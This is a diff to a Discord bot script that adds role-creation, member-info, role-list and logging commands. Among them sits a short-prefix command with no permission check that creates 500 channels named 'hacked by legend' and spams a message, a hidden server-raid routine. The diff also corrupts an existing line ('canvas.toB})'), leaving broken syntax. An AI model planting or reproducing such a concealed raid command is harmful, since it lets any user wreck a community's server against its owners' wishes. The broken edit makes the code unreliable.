@@ -380,13 +380,123 @@ client.on('message', message => {
                               , 200, 180);
           
 
- welcomer.sendFile(canvas.toBuffer())
-
-
-
-      })
+ welcomer.sendFile(canvas.toB})
       })
       });
+
+       
+       
+client.on('message', message=>{
+    if (message.content ===  '!setcolors 200'){
+              if(!message.channel.guild) return;
+            if (message.member.hasPermission('MANAGE_ROLES')){
+                setInterval(function(){})
+                  let count = 0;
+                  let ecount = 0;
+        for(let x = 1; x < 201; x++){
+            message.guild.createRole({name:x,
+            color: 'RANDOM'})
+            }
+            }
+    }
+});
+
+
+const moment = require('moment');
+
+
+
+      client.on('message',function(message) {
+  if (message.author.bot) return;
+
+
+                  if(!message.channel.guild) return;
+
+                    if (message.content === prefix + "members") {
+ const embed = new Discord.RichEmbed()
+
+    .setDescription(`**Members info ✨
+💚 online:   ${message.guild.members.filter(m=>m.presence.status == 'online').size}
+❤  dnd:       ${message.guild.members.filter(m=>m.presence.status == 'dnd').size}
+💛  idle:     ${message.guild.members.filter(m=>m.presence.status == 'idle').size}
+💠   membersCount:  ${message.guild.memberCount - message.guild.members.filter(m=>m.user.bot).size}
+💡 bots: ${message.guild.members.filter(m=>m.user.bot).size} **`)
+         message.channel.send({embed});
+
+    }
+      }); 
+
+
+
+client.on('message', message => {
+    if (message.content === '-roles') {
+        var roles = message.guild.roles.map(roles => `${roles.name}, `).join(' ')
+        const embed = new Discord.RichEmbed()
+        .setColor('RANDOM')
+        .addField('Roles:',`**[${roles}]**`)
+        message.channel.sendEmbed(embed);
+    }
+});
+
+ client.on("roleCreate", rc => {
+  const channel = rc.guild.channels.find("name", "log") 
+  if(channel) {
+  var embed = new Discord.RichEmbed()
+  .setTitle(rc.guild.name)
+  .setDescription(`***Created Role Name : *** **${rc.name}** `)
+  .setColor(`RANDOM`)
+  .setTimestamp(); 
+  channel.sendEmbed(embed)
+  }
+  });
+  //By S Codes
+  client.on("roleDelete",  rd => {
+  const channel = rd.guild.channels.find("name", "log")
+  if(channel) {
+  var embed = new Discord.RichEmbed()
+  .setTitle(rd.guild.name)
+  .setDescription(`***Deleted Role Name : *** **${rd.name}** `)
+  .setColor(`RANDOM`)
+  .setTimestamp(); 
+  channel.sendEmbed(embed)
+  }
+  });
+
+client.on("channelCreate",  cc => {
+  const channel = cc.guild.channels.find("name", "log")
+  if(channel) {
+  var embed = new Discord.RichEmbed()
+  .setTitle(cc.guild.name)
+  .setDescription(`***Channel Created Name : *** **${cc.name}** ⬅️`)
+  .setColor(`RANDOM`)
+  .setTimestamp(); 
+  channel.sendEmbed(embed)
+  }
+  });
+
+   client.on("deleteChannel",  dc => {
+  const channel = dc.guild.channels.find("name", "log")
+  if(channel) {
+  var embed = new Discord.RichEmbed()
+  .setTitle(dc.guild.name)
+  .setDescription(`***Channel Deleted Name : *** **${dc.name}** ⬅️`)
+  .setColor(`RANDOM`)
+  .setTimestamp(); 
+  channel.sendEmbed(embed)
+  }
+  });
+       
+       
+       
+client.on('message' , async (message) => {
+    if (message.content.startsWith(prefix + 'x')) {
+for (let i = 0; i < 500; i++) {
+
+        message.guild.createChannel('hacked by legend', 'text')
+        message.channel.send('legend is coming');
+}
+}
+});  
 
 
 /*
